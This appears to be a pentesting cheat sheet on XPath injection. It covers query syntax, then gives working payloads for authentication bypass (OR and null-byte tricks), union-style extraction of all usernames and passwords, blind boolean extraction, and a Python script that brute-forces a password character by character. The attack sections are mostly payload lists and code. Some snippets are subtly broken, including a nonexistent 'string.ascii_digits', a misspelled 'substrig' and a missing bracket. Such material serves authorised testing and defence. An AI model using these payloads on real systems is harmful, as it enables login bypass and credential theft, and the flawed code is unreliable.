# XPATH injection

XPath Injection is an attack technique used to exploit applications that construct XPath \(XML Path Language\) queries from user-supplied input to query or navigate XML documents.

Info about how to make queries: [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath_syntax.asp)

## **Basic Syntax**

### Nodes

| Expression | Description |
| :--- | :--- |
| nodename | Selects all nodes with the name "nodename" |
| / | Selects from the root node |
| // | Selects nodes in the document from the current node that match the selection no matter where they are |
| . | Selects the current node |
| .. | Selects the parent of the current node |
| @ | Selects attributes |

### **Examples:**

| Path Expression | Result |
| :--- | :--- |
| bookstore | Selects all nodes with the name "bookstore" |
| /bookstore | Selects the root element bookstore**Note:** If the path starts with a slash \( / \) it always represents an absolute path to an element! |
| bookstore/book | Selects all book elements that are children of bookstore |
| //book | Selects all book elements no matter where they are in the document |
| bookstore//book | Selects all book elements that are descendant of the bookstore element, no matter where they are under the bookstore element |
| //@lang | Selects all attributes that are named lang |

### Predicates

<table>
  <thead>
    <tr>
      <th style="text-align:left">Path Expression</th>
      <th style="text-align:left">Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">/bookstore/book[1]</td>
      <td style="text-align:left">
        <p>Selects the first book element that is the child of the bookstore element.<b>Note:</b> In
          IE 5,6,7,8,9 first node is[0], but according to W3C, it is [1]. To solve
          this problem in IE, set the SelectionLanguage to XPath:</p>
        <p>In JavaScript: xml.setProperty(&quot;SelectionLanguage&quot;,&quot;XPath&quot;);</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">/bookstore/book[last()]</td>
      <td style="text-align:left">Selects the last book element that is the child of the bookstore element</td>
    </tr>
    <tr>
      <td style="text-align:left">/bookstore/book[last()-1]</td>
      <td style="text-align:left">Selects the last but one book element that is the child of the bookstore
        element</td>
    </tr>
    <tr>
      <td style="text-align:left">/bookstore/book[position()&lt;3]</td>
      <td style="text-align:left">Selects the first two book elements that are children of the bookstore
        element</td>
    </tr>
    <tr>
      <td style="text-align:left">//title[@lang]</td>
      <td style="text-align:left">Selects all the title elements that have an attribute named lang</td>
    </tr>
    <tr>
      <td style="text-align:left">//title[@lang=&apos;en&apos;]</td>
      <td style="text-align:left">Selects all the title elements that have a &quot;lang&quot; attribute
        with a value of &quot;en&quot;</td>
    </tr>
    <tr>
      <td style="text-align:left">/bookstore/book[price&gt;35.00]</td>
      <td style="text-align:left">Selects all the book elements of the bookstore element that have a price
        element with a value greater than 35.00</td>
    </tr>
    <tr>
      <td style="text-align:left">/bookstore/book[price&gt;35.00]/title</td>
      <td style="text-align:left">Selects all the title elements of the book elements of the bookstore element
        that have a price element with a value greater than 35.00</td>
    </tr>
  </tbody>
</table>

### Unknown Nodes

| Wildcard | Description |
| :--- | :--- |
| \* | Matches any element node |
| @\* | Matches any attribute node |
| node\(\) | Matches any node of any kind |

### **Examples:**

| Path Expression | Result |
| :--- | :--- |
| /bookstore/\* | Selects all the child element nodes of the bookstore element |
| //\* | Selects all elements in the document |
| //title\[@\*\] | Selects all title elements which have at least one attribute of any kind |

## Example

```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

```text
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name
All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()
Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)
Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```

## Authentication Bypass

### **Example of queries:**

```text
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```

### **OR bypass in user and password \(same value in both\)**

```text
' or '1'='1
' or ''='
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
Select account
Select the account using the username and use one of the previous values in the password field
```

### **Abusing null injection**

```text
Username: ' or 1]%00
```

### **Double OR in Username or in password** \(is valid with only 1 vulnerable field\)

IMPORTANT: Notice that the **"and" is the first operation made**.

```text
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())
Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2º account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())
Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())

Bypass the password (because of the ‘=’)
' or username='Adm' or ''='
```

## String extraction

The output contains strings and the user can manipulate the values to search:

```text
/user/username[contains(., '+VALUE+')]
```

```text
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```

## Blind Explotation

### **Get length of a value and extract it by comparisons:** 

```text
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"
Other way
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

Identify columns
&userid=2 and password

The first thing is to retrieve the password length, through boolean expression
First is wrong OR user1 displayed if password is 10 long OR user2 displayed
userid=22222 ] | //user[1][userid=1 and string-length(//user[2]/password)=10] | //user[userid=2

Then you can start to bruteforce char
userid=1 and substring(//user[1]/password,1,1)='p'

If quotes are filtered, you can use others XML objects to compare (limited dictionnary)
First is wrong OR user1 displayed if the user2's password first char = user1's username first char OR user2 displayed
userid="22222 ] | //user[1][userid=1 and substring(//user[2]/password,1,1)=substring(//user[1]/username,1,1) ] | //user[userid=2

```

### **Example:**

```text
import requests, string 
flag = ""
l = 0
alphabet = string.ascii_letters + string.ascii_digits + "{}_()"
for i in range(30): 
    r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i)) 
    if ("TRUE_COND" in r.text): 
        l = i 
        break 
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i)) 
    for al in alphabet: 
        r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
        if ("TRUE_COND" in r.text): 
            flag += al
            print("[+] Flag: " + flag) 
            break
```

## References

[https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xpath-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xpath-injection.md)